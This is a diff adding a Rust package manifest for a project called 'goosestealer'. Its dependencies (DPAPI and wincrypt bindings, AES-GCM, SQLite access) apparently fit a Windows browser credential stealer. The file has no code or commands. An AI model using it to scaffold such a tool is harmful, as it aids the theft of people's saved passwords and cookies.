@@ -1,0 +1,13 @@
+[package]
+name = "goosestealer"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+aes-gcm = { version = "0.10.3", features = ["std"] }
+base64 = "0.22.1"
+rusqlite = { version = "0.32.1", features = ["bundled"] }
+serde = { version = "1.0.217", features = ["derive"] }
+serde_json = "1.0.135"
+shellexpand = "3.1.0"
+winapi = { version = "0.3.9", features = ["dpapi", "wincrypt"] }
